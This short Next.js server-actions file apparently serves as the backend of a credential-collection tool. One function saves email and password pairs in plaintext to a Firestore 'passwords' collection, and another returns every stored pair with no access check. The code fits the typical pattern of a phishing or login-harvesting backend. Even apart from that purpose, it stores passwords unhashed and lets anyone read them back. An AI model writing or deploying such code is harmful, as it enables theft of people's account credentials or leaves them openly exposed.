"use server"

import { db } from "@/lib/firebase";
import { collection, addDoc, getDocs, query, orderBy } from "firebase/firestore";

export async function savePassword(email: string, password: string) {
  try {
    await addDoc(collection(db, "passwords"), {
      email,
      password,
      timestamp: new Date().toISOString(),
    });
    return { success: true };
  } catch (error) {
    console.error("Error saving password:", error);
    return { success: false, error: "Database connection error" };
  }
}

export async function getPasswords() {
  try {
    const q = query(collection(db, "passwords"), orderBy("timestamp", "desc"));
    const querySnapshot = await getDocs(q);
    const results: any[] = [];
    querySnapshot.forEach((doc) => {
      results.push({ id: doc.id, ...doc.data() });
    });
    return { success: true, data: results };
  } catch (error) {
    console.error("Error fetching passwords:", error);
    return { success: false, error: "Access denied or database error" };
  }
}
